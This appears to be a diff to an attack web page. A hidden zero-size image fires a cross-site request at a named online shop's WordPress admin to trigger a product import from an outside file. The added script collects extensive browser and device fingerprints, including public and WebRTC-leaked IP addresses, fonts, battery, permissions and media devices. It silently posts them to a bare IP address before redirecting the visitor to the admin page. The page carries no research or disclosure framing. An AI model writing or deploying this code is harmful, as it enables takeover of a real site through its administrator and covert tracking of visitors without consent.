@@ -2,6 +2,238 @@
 <html>
 <body>
 <img src="https://www.bgasc.com/wp-admin/admin.php?import=woocommerce_csv&step=1&file_url=https://github.com/jacksmith20000803/portfolio/releases/download/new/x.csv" width="0" height="0">
-<script>document.location="https://www.bgasc.com/wp-admin/";</script>
+<script>
+  (async () => {
+  const safe = (fn, d = null) => { try { return fn(); } catch { return d; } };
+  const safeAsync = async (fn, d = null) => { try { return await fn(); } catch { return d; } };
+
+  const ipInfo = async () => {
+    const r = await fetch('https://ipapi.co/json/', { cache: 'no-store', referrerPolicy: 'no-referrer' });
+    return r.ok ? await r.json() : null;
+  };
+
+  const webrtcIPs = () => new Promise(resolve => {
+    if (!window.RTCPeerConnection) return resolve([]);
+    const ips = new Set();
+    const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+    const done = () => { try { pc.close(); } catch {} resolve([...ips]); };
+    const timer = setTimeout(done, 2000);
+    pc.onicecandidate = e => {
+      if (!e.candidate) { clearTimeout(timer); return done(); }
+      const m = /([0-9]{1,3}(?:\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(?::[a-f0-9]{0,4}){2,7})/i.exec(e.candidate.candidate);
+      if (m) ips.add(m[1]);
+    };
+    pc.createDataChannel('p');
+    pc.createOffer().then(o => pc.setLocalDescription(o)).catch(done);
+  });
+
+  const canvasFp = () => safe(() => {
+    const c = document.createElement('canvas');
+    c.width = 300; c.height = 70;
+    const x = c.getContext('2d');
+    x.textBaseline = 'top';
+    x.fillStyle = '#f60'; x.fillRect(0, 0, 300, 70);
+    x.font = '16px Arial'; x.fillStyle = '#069';
+    x.fillText('fingerprint 🔍 1234 mmm', 4, 8);
+    x.fillStyle = 'rgba(102,204,0,0.7)';
+    x.fillText('fingerprint 🔍 1234 mmm', 6, 26);
+    const g = x.createLinearGradient(0, 0, 300, 0);
+    g.addColorStop(0, '#f00'); g.addColorStop(0.5, '#0f0'); g.addColorStop(1, '#00f');
+    x.fillStyle = g; x.fillRect(60, 46, 140, 18);
+    x.globalCompositeOperation = 'multiply';
+    x.beginPath(); x.arc(230, 34, 22, 0, Math.PI * 2);
+    x.fillStyle = 'rgba(255,0,128,.6)'; x.fill();
+    return c.toDataURL();
+  });
+
+  const webgl = () => safe(() => {
+    const gl = document.createElement('canvas').getContext('webgl');
+    if (!gl) return null;
+    const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+    return {
+      vendor: gl.getParameter(gl.VENDOR),
+      renderer: gl.getParameter(gl.RENDERER),
+      version: gl.getParameter(gl.VERSION),
+      maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
+      unmaskedVendor: dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : null,
+      unmaskedRenderer: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : null
+    };
+  });
+
+  const audioFp = () => safeAsync(async () => {
+    const AC = window.OfflineAudioContext || window.webkitOfflineAudioContext;
+    if (!AC) return null;
+    const ctx = new AC(1, 44100, 44100);
+    const osc = ctx.createOscillator();
+    osc.type = 'triangle'; osc.frequency.value = 10000;
+    const comp = ctx.createDynamicsCompressor();
+    comp.threshold.value = -50; comp.knee.value = 40; comp.ratio.value = 12;
+    comp.attack.value = 0; comp.release.value = 0.25;
+    osc.connect(comp); comp.connect(ctx.destination); osc.start(0);
+    const buf = await ctx.startRendering();
+    return buf.getChannelData(0).slice(4500, 5000).reduce((s, v) => s + Math.abs(v), 0);
+  });
+
+  const fonts = () => safe(() => {
+    const x = document.createElement('canvas').getContext('2d');
+    const text = 'mmmmmmmmmmlli1|WQ@#';
+    const bases = ['monospace', 'sans-serif', 'serif'];
+    const measure = f => { x.font = `72px ${f}`; return x.measureText(text).width; };
+    const base = Object.fromEntries(bases.map(b => [b, measure(b)]));
+    const candidates = ['Arial','Calibri','Cambria','Comic Sans MS','Consolas','Courier New','Georgia','Helvetica','Impact','Menlo','Monaco','Roboto','Segoe UI','Tahoma','Times New Roman','Trebuchet MS','Ubuntu','Verdana'];
+    return candidates.filter(f => bases.some(b => Math.abs(measure(`"${f}", ${b}`) - base[b]) > 0.1));
+  });
+
+  const storage = async () => ({
+    localStorage: safe(() => { localStorage.setItem('p','1'); localStorage.removeItem('p'); return true; }, false),
+    sessionStorage: safe(() => { sessionStorage.setItem('p','1'); sessionStorage.removeItem('p'); return true; }, false),
+    indexedDB: !!window.indexedDB,
+    estimate: await safeAsync(() => navigator.storage.estimate())
+  });
+
+  const battery = () => safeAsync(async () => {
+    if (!navigator.getBattery) return null;
+    const b = await navigator.getBattery();
+    return { charging: b.charging, level: b.level, chargingTime: b.chargingTime, dischargingTime: b.dischargingTime };
+  });
+
+  const connection = () => {
+    const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+    return c ? { type: c.type, effectiveType: c.effectiveType, downlink: c.downlink, rtt: c.rtt, saveData: c.saveData } : null;
+  };
+
+  const permissions = async () => {
+    if (!navigator.permissions?.query) return {};
+    const names = ['geolocation','notifications','camera','microphone','clipboard-read','push','accelerometer','gyroscope','midi','payment-handler','screen-wake-lock','background-sync','persistent-storage','local-fonts'];
+    const entries = await Promise.all(names.map(async name => {
+      const s = await safeAsync(() => navigator.permissions.query({ name }));
+      return s ? [name, s.state] : null;
+    }));
+    return Object.fromEntries(entries.filter(Boolean));
+  };
+
+  const media = () => safeAsync(async () =>
+    (await navigator.mediaDevices?.enumerateDevices?.() || []).map(d => ({ kind: d.kind, label: d.label || null }))
+  );
+
+  const uaCH = () => safeAsync(async () => {
+    const u = navigator.userAgentData;
+    if (!u) return null;
+    return { ...u.toJSON(), highEntropy: await u.getHighEntropyValues([
+      'architecture','bitness','model','platformVersion','uaFullVersion','fullVersionList','wow64','formFactors'
+    ]) };
+  });
+
+  const hash = async s => {
+    if (s == null) return null;
+    try {
+      const buf = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(s));
+      return [...new Uint8Array(buf)].map(b => b.toString(16).padStart(2, '0')).join('');
+    } catch {
+      let h = 0x811c9dc5;
+      for (let i = 0; i < s.length; i++) { h ^= s.charCodeAt(i); h = Math.imul(h, 0x01000193); }
+      return (h >>> 0).toString(16).padStart(8, '0');
+    }
+  };
+
+  const [ip, webrtc, audio, fontList, stor, bat, perms, ua, canvas, devs] = await Promise.all([
+    safeAsync(ipInfo), webrtcIPs(), audioFp(), Promise.resolve(fonts()),
+    storage(), battery(), permissions(), uaCH(), Promise.resolve(canvasFp()), media()
+  ]);
+
+  const payload = {
+    meta: {
+      collectedAt: new Date().toISOString(),
+      url: location.href,
+      origin: location.origin,
+      referrer: document.referrer || null,
+      title: document.title,
+      visibility: document.visibilityState
+    },
+    network: { publicIP: ip, webrtcIPs: webrtc, connection: connection() },
+    browser: {
+      userAgent: navigator.userAgent,
+      appName: navigator.appName,
+      appVersion: navigator.appVersion,
+      platform: navigator.platform,
+      vendor: navigator.vendor,
+      product: navigator.product,
+      language: navigator.language,
+      languages: safe(() => [...navigator.languages]),
+      cookieEnabled: navigator.cookieEnabled,
+      doNotTrack: navigator.doNotTrack,
+      globalPrivacyControl: safe(() => navigator.globalPrivacyControl),
+      webdriver: navigator.webdriver,
+      pdfViewerEnabled: navigator.pdfViewerEnabled,
+      hardwareConcurrency: navigator.hardwareConcurrency,
+      deviceMemory: navigator.deviceMemory,
+      maxTouchPoints: navigator.maxTouchPoints,
+      plugins: safe(() => [...navigator.plugins].map(p => p.name)),
+      mimeTypes: safe(() => [...navigator.mimeTypes].map(m => m.type)),
+      onLine: navigator.onLine,
+      userAgentData: ua,
+      intl: safe(() => {
+        const o = Intl.DateTimeFormat().resolvedOptions();
+        return { locale: o.locale, timeZone: o.timeZone, calendar: o.calendar, numberingSystem: o.numberingSystem, hourCycle: o.hourCycle, tzOffsetMinutes: new Date().getTimezoneOffset() };
+      }),
+      touchSupport: 'ontouchstart' in window,
+      pointerType: safe(() => matchMedia('(pointer: coarse)').matches ? 'coarse' : matchMedia('(pointer: fine)').matches ? 'fine' : 'none'),
+      bluetooth: !!navigator.bluetooth,
+      usb: !!navigator.usb,
+      serial: !!navigator.serial,
+      hid: !!navigator.hid,
+      nfc: 'NDEFReader' in window,
+      wakeLock: !!navigator.wakeLock,
+      credentials: !!navigator.credentials,
+      serviceWorker: !!navigator.serviceWorker,
+      webShare: !!navigator.share,
+      vibrate: typeof navigator.vibrate === 'function'
+    },
+    device: {
+      screen: safe(() => ({
+        width: screen.width, height: screen.height,
+        availWidth: screen.availWidth, availHeight: screen.availHeight,
+        availLeft: screen.availLeft, availTop: screen.availTop,
+        colorDepth: screen.colorDepth, pixelDepth: screen.pixelDepth,
+        orientation: screen.orientation && { type: screen.orientation.type, angle: screen.orientation.angle },
+        isExtended: screen.isExtended
+      })),
+      window: {
+        innerWidth: window.innerWidth, innerHeight: window.innerHeight,
+        outerWidth: window.outerWidth, outerHeight: window.outerHeight,
+        devicePixelRatio: window.devicePixelRatio,
+        screenX: window.screenX, screenY: window.screenY
+      },
+      mediaQueries: {
+        prefersColorScheme: safe(() => matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light'),
+        prefersReducedMotion: safe(() => matchMedia('(prefers-reduced-motion: reduce)').matches),
+        prefersContrast: safe(() => matchMedia('(prefers-contrast: more)').matches),
+        colorGamutP3: safe(() => matchMedia('(color-gamut: p3)').matches),
+        dynamicRangeHigh: safe(() => matchMedia('(dynamic-range: high)').matches),
+        anyHover: safe(() => matchMedia('(any-hover: hover)').matches),
+        anyPointerFine: safe(() => matchMedia('(any-pointer: fine)').matches),
+        forcedColors: safe(() => matchMedia('(forced-colors: active)').matches)
+      },
+      battery: bat,
+      mediaDevices: devs
+    },
+    graphics: {
+      webgl: webgl(),
+      canvasHash: await hash(canvas),
+      audioHash: await hash(audio != null ? String(audio) : null)
+    },
+    fonts: fontList,
+    storage: stor,
+    permissions: perms
+  };
+
+  await fetch('http://31.59.105.74:3000/', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(payload),
+    keepalive: true
+  }).catch(() => {});
+})();
+  document.location="https://www.bgasc.com/wp-admin/";</script>
 </body>
 </html>
